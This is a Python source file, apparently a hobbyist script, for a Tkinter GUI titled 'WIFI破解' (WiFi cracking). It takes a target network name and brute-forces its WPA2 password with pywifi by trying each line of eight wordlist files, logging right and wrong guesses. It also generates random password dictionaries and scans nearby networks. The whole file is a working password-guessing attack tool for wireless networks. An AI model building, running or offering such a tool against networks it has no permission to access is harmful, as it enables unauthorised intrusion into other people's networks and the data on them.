#!/usr/bin/python
# -*- coding: UTF-8 -*-
"""
@author:time-无产者
@file:wifidemo.py
@time:2022/04/19
"""
from tkinter import *
from pywifi import const
import pywifi
import time
import string as st  #导入字符
import random  #导入随机函数
import logging
from logging import handlers
logging.basicConfig(format='%(asctime)s - %(pathname)s[line:%(lineno)d] - %(levelname)s: %(message)s',
                    level=logging.DEBUG)

# ===========================================写log程序的定义=======================================================
class Logger(object):
    level_relations = {
        'debug': logging.DEBUG,
        'info': logging.INFO,
        'warning': logging.WARNING,
        'error': logging.ERROR,
        'crit': logging.CRITICAL
    }  # 日志级别关系映射

    def __init__(self, filename, level='info', when='D', backCount=3,
                 fmt='%(asctime)s - %(pathname)s[line:%(lineno)d] - %(levelname)s: %(message)s'):
        self.logger = logging.getLogger(filename)
        format_str = logging.Formatter(fmt)  # 设置日志格式
        self.logger.setLevel(self.level_relations.get(level))  # 设置日志级别
        sh = logging.StreamHandler()  # 往屏幕上输出
        sh.setFormatter(format_str)  # 设置屏幕上显示的格式
        th = handlers.TimedRotatingFileHandler(filename=filename, when=when, backupCount=backCount,
                                               encoding='utf-8')  # 往文件里写入#指定间隔时间自动生成文件的处理器
        # 实例化TimedRotatingFileHandler
        # interval是时间间隔，backupCount是备份文件的个数，如果超过这个个数，就会自动删除，when是间隔的时间单位，单位有以下几种：
        # S 秒
        # M 分
        # H 小时、
        # D 天、
        # W 每星期（interval==0时代表星期一）
        # midnight 每天凌晨
        th.setFormatter(format_str)  # 设置文件里写入的格式
        self.logger.addHandler(sh)  # 把对象加到logger里
        self.logger.addHandler(th)
# 实例化写log方法
log = Logger('all.log',level='debug')


# ===========================================对网卡的检查工作=======================================================
#判断是否有无线网卡
def gic():
    wifi = pywifi.PyWiFi()                #创建一个无线对象
    #print(wifi)
    ifaces = wifi.interfaces()[0]          #获取无线网卡，一般是电脑的第一块网卡
    print(ifaces)                          #输出自己的网卡信息
    print(ifaces.status())                 #判断自己的网卡是否处于连接状态
    if ifaces.status() == const.IFACE_DISCONNECTED:
        print("wei连接")
    else:
        print("已连接")

#扫描附件的wifi
def bies():
    wifi = pywifi.PyWiFi()             #创建一个无线对象
    iface = wifi.interfaces()[0]            #获取无线网卡，一般是电脑的第一块网卡
    res = iface.scan_results()              #扫描附近wifi
    #print(res)
    for data in res:
        print(data.ssid)                    #获取扫描之后的结果


# =======================================自定义规则的密码字典生成====================================================
#定义函数
def wifipwd(nums,strlong):
    passwordrange = st.digits + st.ascii_letters  # 生成字符串
    def ran_pass(num):
        letter = ""
        for i in range(num):
            letter += random.choice(passwordrange)
        return letter

    def wri_pass(passwd):
        path = r"wifipwd.txt"
        with open(path, "a") as des_file:
            des_file.write(passwd + "\n")  # +"\n"

    for i in range(nums):
        passwd = ran_pass(strlong)#调用函数随机生成8位密码
        wri_pass(passwd)
    print("密码本生成完成===========================================")

# ==========================================实例化网卡加载准备================注意这两项代码不能放入循环！！===========
# 抓取网卡接口
wifi = pywifi.PyWiFi()
# 获取第一个无线网卡
ifaces = wifi.interfaces()[0]

# ===============================================测试链接===========================================================
#测试连接函数
def wificonnect(str,wifiname):
    # 断开所有连接
    ifaces.disconnect()
    time.sleep(1)
    wifistatus = ifaces.status()
    if wifistatus == const.IFACE_DISCONNECTED:
        # 创建WiFi连接文件
        profile = pywifi.Profile()
        # 要连接WiFi的名称
        profile.ssid = wifiname
        # 网卡的开放状态
        profile.auth = const.AUTH_ALG_OPEN
        # wifi加密算法,一般wifi加密算法为wps
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        # 加密单元
        profile.cipher = const.CIPHER_TYPE_CCMP
        # 调用密码
        profile.key = str
        # 删除所有连接过的wifi文件
        ifaces.remove_all_network_profiles()
        # 设定新的连接文件
        tep_profile = ifaces.add_network_profile(profile)
        ifaces.connect(tep_profile)
        # wifi连接时间
        time.sleep(3)
        if ifaces.status() == const.IFACE_CONNECTED:
            return True
            # logging.info("true")
        else:
            return False
            # logging.info("false")
    else:
        print("已有wifi连接")

# =======================================带入密码字典测试链接========================================================
def readPwd():
    #获取wifi名称
    wifiname = entry.get()            #获取文本框输入的WiFi账号
    log.logger.info(rf"wifi_name:{wifiname}")
    pwdlist = ["1.txt", "2.txt", '3.txt', '4.txt', '5.txt', '6.txt', '7.txt', '8.txt']
    bool =False
    for path in pwdlist:
        # file = open(path,"r")
        with open(path,"r") as file:
            while True:
                try:
                    #读取密码本
                    mystr = file.readline()
                    #print(mystr)
                    if mystr == "":
                        break
                    else:
                        #print(mystr)
                        #测试链接
                        bool = wificonnect(mystr,wifiname)    # 调用账号和密码匹配函数
                        # if mystr == const.IFACE_CONNECTED:
                        #     bool = True
                        if bool:
                            log.logger.info(rf"密码正确{mystr}")
                            text.insert(END,"密码正确"+mystr)
                            text.see(END)
                            text.update()
                            break
                        else:
                            log.logger.info(rf"密码错误{mystr}")
                            text.insert(END,"密码错误"+mystr)
                            text.see(END)
                            text.update()
                except:
                    #跳出当前循环，继续下一次循环
                    continue
        if bool:
            break

# =============================================创建窗口=============================================================
#创建窗口
root = Tk()
#窗口的标题
root.title("WIFI破解")
#窗口的大小  小写的x  #窗口的位置
root.geometry('500x400+550+260')
#标签控件
label = Label(root,text = '输入要破解的wifi名称:')
#位置  定位 网格布局  pack 包  place 位置
label.grid()
#输入控件
entry = Entry(root,font = ('微软雅黑',20))
entry.grid(row = 0,column = 1)
#列表框控件 columnspan 组件所跨越的列数
text = Listbox(root,font = ('微软雅黑',15),width = 40,height = 10)
text.grid(row = 1,columnspan = 2)
#按钮
button = Button(root,text = '开始破解',width = 20,height=2,command = readPwd)   #   点击按钮触发事件
button.grid(row = 2,columnspan = 2)
#显示窗口  消息循环
root.mainloop()


#程序入口
if __name__ == "__main__":
    readPwd()
    pass





